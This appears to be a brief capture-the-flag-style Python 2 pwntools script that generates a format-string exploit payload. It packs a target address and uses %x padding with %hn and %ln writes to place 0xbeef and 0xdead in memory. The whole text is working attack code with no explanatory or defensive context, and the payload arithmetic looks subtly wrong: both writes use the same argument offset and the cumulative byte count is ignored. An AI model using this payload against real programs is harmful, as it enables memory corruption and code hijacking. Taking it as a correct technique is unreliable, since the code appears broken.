from pwn import *

add = 0x804a038

value1 = 0xbeef
value2 = 0xdead
payload = "X" + p32(add) + "%" + str(value1) + "x%6$hn"
payload += "%" + str(value2) + "x%6$ln"

print payload
